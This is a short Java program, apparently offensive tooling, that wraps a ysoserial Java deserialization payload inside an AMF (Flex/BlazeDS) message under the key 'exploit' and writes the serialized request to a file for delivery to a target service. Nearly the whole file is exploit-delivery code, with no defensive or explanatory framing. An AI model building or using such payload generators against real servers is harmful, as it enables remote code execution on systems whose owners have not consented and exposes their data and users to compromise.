# Note

import flex.messaging.io.amf.ASObject;
import flex.messaging.io.amf.Amf3Output;
import flex.messaging.io.amf.MessageBody;
import flex.messaging.io.amf.AmfMessage;
import flex.messaging.io.SerializationContext;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;

public class AMFPayloadGenerator {

    public static void main(String[] args) throws Exception {
        // Read the ysoserial payload
        FileInputStream fis = new FileInputStream("ysoserial_payload.bin");
        byte[] ysoserialPayload = new byte[fis.available()];
        fis.read(ysoserialPayload);
        fis.close();

        // Create an ASObject to hold the payload
        ASObject asObject = new ASObject();
        asObject.put("exploit", ysoserialPayload);

        // Create the AMF message body
        MessageBody messageBody = new MessageBody("ServiceName.methodName", "/1", new Object[] { asObject });

        // Create the AMF message
        AmfMessage amfMessage = new AmfMessage();
        amfMessage.addBody(messageBody);

        // Serialize the AMF message
        SerializationContext context = new SerializationContext();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Amf3Output amf3Output = new Amf3Output(context);
        amf3Output.setOutputStream(baos);
        amf3Output.writeObject(amfMessage);

        byte[] amfPayload = baos.toByteArray();
        baos.close();

        // Write the serialized AMF message to a file
        FileOutputStream fos = new FileOutputStream("amf_request.bin");
        fos.write(amfPayload);
        fos.close();

        System.out.println("AMF payload generated successfully.");
    }
}
